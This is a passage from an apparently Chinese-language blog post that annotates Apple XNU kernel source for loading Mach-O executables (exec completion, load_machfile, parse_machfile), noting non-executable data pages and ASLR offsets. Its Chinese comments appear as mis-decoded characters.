class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * If posix_spawned with the START_SUSPENDED flag, stop the</div><div class="line">	 * process before it runs.</div><div class="line">	 */</div><div class="line">	<span class="function"><span class="title">if</span> (imgp-&gt;</span>ip_px_sa != NULL) &#123;</div><div class="line">		<span class="function"><span class="title">psa</span> = (struct _posix_spawnattr *) imgp-&gt;</span>ip_px_sa;</div><div class="line">		<span class="function"><span class="title">if</span> (psa-&gt;</span>psa_flags &amp; POSIX_SPAWN_START_SUSPENDED) &#123;</div><div class="line">			proc_lock(p);</div><div class="line">			<span class="function"><span class="title">p</span>-&gt;</span>p_stat = SSTOP;</div><div class="line">			proc_unlock(p);</div><div class="line">			(<span class="function"><span class="title">void</span>) task_suspend_internal(p-&gt;</span>task);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * mark as execed, wakeup the process that vforked (if any) and tell</div><div class="line">	 * it that it now has its own resources back</div><div class="line">	 */</div><div class="line">	OSB<span class="function"><span class="title">itOrAtomic</span>(P_EXEC, &amp;p-&gt;</span>p_flag);</div><div class="line">	proc_resetregister(p);</div><div class="line">	<span class="function"><span class="title">if</span> (p-&gt;</span><span class="function"><span class="title">p_pptr</span> &amp;&amp; (p-&gt;</span>p_lflag &amp; P_LPPWAIT)) &#123;</div><div class="line">		proc_lock(p);</div><div class="line">		<span class="function"><span class="title">p</span>-&gt;</span>p_lflag &amp;= ~P_LPPWAIT;</div><div class="line">		proc_unlock(p);</div><div class="line">		<span class="function"><span class="title">wakeup</span>((caddr_t)p-&gt;</span>p_pptr);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Pay for our earlier safety; deliver the delayed signals from</div><div class="line">	 * the incomplete vfexec process now that it's complete.</div><div class="line">	 */</div><div class="line">	<span class="function"><span class="title">if</span> (vfexec &amp;&amp; (p-&gt;</span>p_lflag &amp; P_LTRACED)) &#123;</div><div class="line">		psignal_vfork(p, new_task, thread, SIGTRAP);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	goto done;</div><div class="line"></div><div class="line">badtoolate:</div><div class="line">	<span class="comment">/* Don't allow child process to execute any instructions */</span></div><div class="line">	<span class="keyword">if</span> (!spawn) &#123;</div><div class="line">		<span class="keyword">if</span> (vfexec) &#123;</div><div class="line">			psignal_vfork(p, new_task, thread, SIGKILL);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			psignal(p, SIGKILL);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">/* We can't stop this system call at this point, so just pretend we succeeded */</span></div><div class="line">		error = <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">done:</div><div class="line">	<span class="keyword">if</span> (!spawn) &#123;</div><div class="line">		<span class="comment">/* notify only if it has not failed due to FP Key error */</span></div><div class="line">		<span class="function"><span class="title">if</span> ((p-&gt;</span>p_lflag &amp; P_LTERM_DECRYPTFAIL) == <span class="number">0</span>)</div><div class="line">			proc_knote(p, NOTE_EXEC);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/* Drop extra references for cases where we don't expect the caller to clean up */</span></div><div class="line">	<span class="keyword">if</span> (vfexec || (spawn &amp;&amp; error == <span class="number">0</span>)) &#123;</div><div class="line">		task_deallocate(new_task);</div><div class="line">		thread_deallocate(thread);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (load_result.threadstate) &#123;</div><div class="line">		kfree(load_result.threadstate, load_result.threadstate_sz);</div><div class="line">		load_result.threadstate = NULL;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">bad:</div><div class="line">	return(error);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>è¿™é‡Œä¸»è¦å¯¹å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ä½œäº†æ£€æµ‹ï¼Œå¦‚headerï¼ŒCPUï¼Œimgpç­‰ï¼Œç„¶åæŠŠMach-Oæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œè°ƒç”¨load_machfile()å‡½æ•°ï¼Œç”±dyldåŠ è½½</li>
</ul>
<h3 id="1-4-load-machfile"><a href="#1-4-load-machfile" class="headerlink" title="1.4 load_machfile"></a>1.4 <code>load_machfile</code></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">load_return_t</span></div><div class="line">load_machfile(</div><div class="line">	<span class="keyword">struct</span> image_params	*imgp,</div><div class="line">	<span class="keyword">struct</span> mach_header	*header,</div><div class="line">	<span class="keyword">thread_t</span> 		thread,</div><div class="line">	<span class="keyword">vm_map_t</span> 		*mapp,</div><div class="line">	<span class="keyword">load_result_t</span>		*result</div><div class="line">)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> vnode		*vp = imgp-&gt;ip_vp;</div><div class="line">	<span class="keyword">off_t</span>			file_offset = imgp-&gt;ip_arch_offset;</div><div class="line">	<span class="keyword">off_t</span>			macho_size = imgp-&gt;ip_arch_size;</div><div class="line">	<span class="keyword">off_t</span>			file_size = imgp-&gt;ip_vattr-&gt;va_data_size;</div><div class="line">	<span class="keyword">vm_map_t</span>		new_map = *mapp;</div><div class="line">	<span class="keyword">pmap_t</span>			pmap = <span class="number">0</span>;	<span class="comment">/* protected by create_map */</span></div><div class="line">	<span class="keyword">vm_map_t</span>		<span class="built_in">map</span>;</div><div class="line">	<span class="keyword">load_result_t</span>		myresult;</div><div class="line">	<span class="keyword">load_return_t</span>		lret;</div><div class="line">	<span class="keyword">boolean_t</span> create_map = FALSE;</div><div class="line">	<span class="keyword">boolean_t</span> enforce_hard_pagezero = TRUE;</div><div class="line">	<span class="keyword">int</span> spawn = (imgp-&gt;ip_flags &amp; IMGPF_SPAWN);</div><div class="line">	<span class="keyword">task_t</span> task = current_task();</div><div class="line">	<span class="keyword">proc_t</span> p = current_proc();</div><div class="line">	<span class="keyword">mach_vm_offset_t</span>	aslr_offset = <span class="number">0</span>;</div><div class="line">	<span class="keyword">mach_vm_offset_t</span>	dyld_aslr_offset = <span class="number">0</span>;</div><div class="line">	<span class="keyword">kern_return_t</span> 		kret;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (macho_size &gt; file_size) &#123;</div><div class="line">		<span class="keyword">return</span>(LOAD_BADMACHO);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (new_map == VM_MAP_NULL) &#123;</div><div class="line">		create_map = TRUE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * If we are spawning, we have created backing objects for the process</div><div class="line">	 * already, which include non-lazily creating the task map.  So we</div><div class="line">	 * are going to switch out the task map with one appropriate for the</div><div class="line">	 * bitness of the image being loaded.</div><div class="line">	 */</div><div class="line">	<span class="keyword">if</span> (spawn) &#123;</div><div class="line">		create_map = TRUE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (create_map) &#123;</div><div class="line">		<span class="keyword">task_t</span> ledger_task;</div><div class="line">		<span class="keyword">if</span> (imgp-&gt;ip_new_thread) &#123;</div><div class="line">			ledger_task = get_threadtask(imgp-&gt;ip_new_thread);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			ledger_task = task;</div><div class="line">		&#125;</div><div class="line">		pmap = pmap_create(get_task_ledger(ledger_task),</div><div class="line">				   (<span class="keyword">vm_map_size_t</span>) <span class="number">0</span>,</div><div class="line">				   ((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) != <span class="number">0</span>));</div><div class="line">		pal_switch_pmap(thread, pmap, imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT);</div><div class="line">		<span class="built_in">map</span> = vm_map_create(pmap,</div><div class="line">				<span class="number">0</span>,</div><div class="line">				vm_compute_max_offset(((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) == IMGPF_IS_64BIT)),</div><div class="line">				TRUE);</div><div class="line">	&#125; <span class="keyword">else</span></div><div class="line">		<span class="built_in">map</span> = new_map;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span>   (__ARM_ARCH_7K__ &gt;= 2) &amp;&amp; defined(PLATFORM_WatchOS)</span></div><div class="line">	<span class="comment">/* enforce 16KB alignment for watch targets with new ABI */</span></div><div class="line">	vm_map_set_page_shift(<span class="built_in">map</span>, SIXTEENK_PAGE_SHIFT);</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __arm64__ */</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span>	CONFIG_ENFORCE_SIGNED_CODE</span></div><div class="line">	<span class="comment">/* This turns off faulting for executable pages, which allows</span></div><div class="line">	 * to circumvent Code Signing Enforcement. The per process</div><div class="line">	 * flag (CS_ENFORCEMENT) is not set yet, but we can use the</div><div class="line">	 * global flag.</div><div class="line">	 */</div><div class="line">	<span class="keyword">if</span> ( !cs_enforcement(<span class="literal">NULL</span>) &amp;&amp; (header-&gt;flags &amp; MH_ALLOW_STACK_EXECUTION) )</div><div class="line">	        vm_map_disable_NX(<span class="built_in">map</span>);</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">	<span class="comment">/* Forcibly disallow execution from data pages on even if the arch</span></div><div class="line">	 * normally permits it. */</div><div class="line">	<span class="comment">////å°†å†…å­˜è®¾ç½®ä¸ºä¸å¯æ‰§è¡Œï¼Œç”¨æ¥é˜²æ­¢äº§ç”Ÿæº¢å‡ºæ¼æ´</span></div><div class="line">	<span class="keyword">if</span> ((header-&gt;flags &amp; MH_NO_HEAP_EXECUTION) &amp;&amp; !(imgp-&gt;ip_flags &amp; IMGPF_ALLOW_DATA_EXEC))</div><div class="line">		vm_map_disallow_data_exec(<span class="built_in">map</span>);</div><div class="line">	</div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Compute a random offset for ASLR, and an independent random offset for dyld.</div><div class="line">	 */</div><div class="line">	<span class="comment">//è®¡ç®—ASLRçš„åç§»é‡</span></div><div class="line">	<span class="keyword">if</span> (!(imgp-&gt;ip_flags &amp; IMGPF_DISABLE_ASLR)) &#123;</div><div class="line">		<span class="keyword">uint64_t</span> max_slide_pages;</div><div class="line"></div><div class="line">		max_slide_pages = vm_map_get_max_aslr_slide_pages(<span class="built_in">map</span>);</div><div class="line"></div><div class="line">		aslr_offset = random();</div><div class="line">		aslr_offset %= max_slide_pages;</div><div class="line">		aslr_offset &lt;&lt;= vm_map_page_shift(<span class="built_in">map</span>);</div><div class="line"></div><div class="line">		dyld_aslr_offset = random();</div><div class="line">		dyld_aslr_offset %= max_slide_pages;</div><div class="line">		dyld_aslr_offset &lt;&lt;= vm_map_page_shift(<span class="built_in">map</span>);</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> (!result)</div><div class="line">		result = &amp;myresult;</div><div class="line"></div><div class="line">	*result = load_result_null;</div><div class="line">	<span class="comment">//è§£æMach-Oæ–‡ä»¶</span></div><div class="line">	lret = parse_machfile(vp, <span class="built_in">map</span>, thread, header, file_offset, macho_size,</div><div class="line">	                      <span class="number">0</span>, (<span class="keyword">int64_t</span>)aslr_offset, (<span class="keyword">int64_t</span>)dyld_aslr_offset, result);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (lret != LOAD_SUCCESS) &#123;</div><div class="line">		<span class="keyword">if</span> (create_map) &#123;</div><div class="line">			vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span>(lret);</div><div class="line">	&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> __x86_64__</span></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * On x86, for compatibility, don't enforce the hard page-zero restriction for 32-bit binaries.</div><div class="line">	 */</div><div class="line">	<span class="keyword">if</span> ((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) == <span class="number">0</span>) &#123;</div><div class="line">		enforce_hard_pagezero = FALSE;</div><div class="line">	&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Check to see if the page zero is enforced by the map-&gt;min_offset.</div><div class="line">	 */ </div><div class="line">	<span class="keyword">if</span> (enforce_hard_pagezero &amp;&amp;</div><div class="line">	    (vm_map_has_hard_pagezero(<span class="built_in">map</span>, <span class="number">0x1000</span>) == FALSE)) &#123;</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">if</span> (create_map) &#123;</div><div class="line">				vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> (LOAD_BADMACHO);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (create_map) &#123;</div><div class="line">		<span class="comment">/*</span></div><div class="line">		 * If this is an exec, then we are going to destroy the old</div><div class="line">		 * task, and it's correct to halt it; if it's spawn, the</div><div class="line">		 * task is not yet running, and it makes no sense.</div><div class="line">		 */</div><div class="line">		<span class="keyword">if</span> (!spawn) &#123;</div><div class="line">			<span class="comment">/*</span></div><div class="line">			 * Mark the task as halting and start the other</div><div class="line">			 * threads towards terminating themselves.  Then</div><div class="line">			 * make sure any threads waiting for a process</div><div class="line">			 * transition get informed that we are committed to</div><div class="line">			 * this transition, and then finally complete the</div><div class="line">			 * task halting (wait for threads and then cleanup</div><div class="line">			 * task resources).</div><div class="line">			 *</div><div class="line">			 * <span class="doctag">NOTE:</span> task_start_halt() makes sure that no new</div><div class="line">			 * threads are created in the task during the transition.</div><div class="line">			 * We need to mark the workqueue as exiting before we</div><div class="line">			 * wait for threads to terminate (at the end of which</div><div class="line">			 * we no longer have a prohibition on thread creation).</div><div class="line">			 * </div><div class="line">			 * Finally, clean up any lingering workqueue data structures</div><div class="line">			 * that may have been left behind by the workqueue threads</div><div class="line">			 * as they exited (and then clean up the work queue itself).</div><div class="line">			 */</div><div class="line">			kret = task_start_halt(task);</div><div class="line">			<span class="keyword">if</span> (kret != KERN_SUCCESS) &#123;</div><div class="line">				vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></div><div class="line">				<span class="keyword">return</span> (LOAD_FAILURE);</div><div class="line">			&#125;</div><div class="line">			proc_transcommit(p, <span class="number">0</span>);</div><div class="line">			workqueue_mark_exiting(p);</div><div class="line">			task_complete_halt(task);</div><div class="line">			workqueue_exit(p);</div><div class="line">			kqueue_dealloc(p-&gt;p_wqkqueue);</div><div class="line">			p-&gt;p_wqkqueue = <span class="literal">NULL</span>;</div><div class="line">		&#125;</div><div class="line">		*mapp = <span class="built_in">map</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span>(LOAD_SUCCESS);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> macho_printf = <span class="number">0</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MACHO_PRINTF(args)				\</span></div><div class="line">	do &#123;						\</div><div class="line">		<span class="meta-keyword">if</span> (macho_printf) &#123;			\</div><div class="line">			printf args;			\</div><div class="line">		&#125;					\</div><div class="line">	&#125; while (0)</div></pre></td></tr></table></figure>
<ul>
<li>ä¸»è¦è§£æäº†Mach-Oæ–‡ä»¶ï¼Œè®¾ç½®å†…å­˜ä¸å¯æ‰§è¡Œï¼Œé˜²æ­¢äº†äº§ç”Ÿæº¢å‡ºæ¼æ´ï¼Œè¿˜è®¾ç½®äº†ASLRåç§»</li>
</ul>
<h3 id="1-5-parse-machfile"><a href="#1-5-parse-machfile" class="headerlink" title="1.5 parse_machfile"></a>1.5 <code>parse_machfile</code></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span></span></div><div class="line">load_return_t</div><div class="line"><span class="title">parse_machfile</span><span class="params">(</span></div><div class="line">	<span class="keyword">struct</span> vnode 		*vp,       </div><div class="line">	<span class="keyword">vm_map_t</span>		<span class="built_in">map</span>,</div><div class="line">	<span class="keyword">thread_t</span>		thread,</div><div class="line">	<span class="keyword">struct</span> mach_header	*header,</div><div class="line">	<span class="keyword">off_t</span>			file_offset,</div><div class="line">	<span class="keyword">off_t</span>			macho_size,</div><div class="line">	<span class="keyword">int</span>			depth,</div><div class="line">	<span class="keyword">int64_t</span>			aslr_offset,</div><div class="line">	<span class="keyword">int64_t</span>			dyld_aslr_offset,</div><div class="line">	<span class="keyword">load_result_t</span>		*result</div><div class="line">)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">uint32_t</span>		ncmds;</div><div class="line">	<span class="keyword">struct</span> load_command	*lcp;</div><div class="line">	<span class="keyword">struct</span> dylinker_command	*dlp = <span class="number">0</span>;</div><div class="line">	<span class="keyword">integer_t</span>		dlarchbits = <span class="number">0</span>;</div><div class="line">	<span class="keyword">void</span> *			control;</div><div class="line">	<span class="keyword">load_return_t</span>		ret = LOAD_SUCCESS;</div><div class="line">	<span class="keyword">caddr_t</span>			addr;</div><div class="line">	<span class="keyword">void</span> *			kl_addr;</div><div class="line">	<span class="keyword">vm_size_t</span>		size,kl_size;</div><div class="line">	<span class="keyword">size_t</span>			offset;</div><div class="line">	<span class="keyword">size_t</span>			oldoffset;	<span class="comment">/* for overflow check */</span></div><div class="line">	<span class="keyword">int</span>			pass;</div><div class="line">	<span class="keyword">proc_t</span>			p = current_proc();		<span class="comment">/* XXXX */</span></div><div class="line">	<span class="keyword">int</span>			error;</div><div class="line">	<span class="keyword">int</span> 			resid = <span class="number">0</span>;</div><div class="line">	<span class="keyword">size_t</span>			mach_header_sz = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mach_header);</div><div class="line">	<span class="keyword">boolean_t</span>		abi64;</div><div class="line">	<span class="keyword">boolean_t</span>		got_code_signatures = FALSE;</div><div class="line">	<span class="keyword">int64_t</span>			slide = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (header-&gt;magic == MH_MAGIC_64 ||</div><div class="line">	    header-&gt;magic == MH_CIGAM_64) &#123;</div><div class="line">	    	mach_header_sz = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mach_header_64);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 *	Break infinite recursion</div><div class="line">	 */</div><div class="line">	<span class="keyword">if</span> (depth &gt; <span class="number">1</span>) &#123;</div><div class="line">		<span class="keyword">return</span>(LOAD_FAILURE);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	depth++;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 *	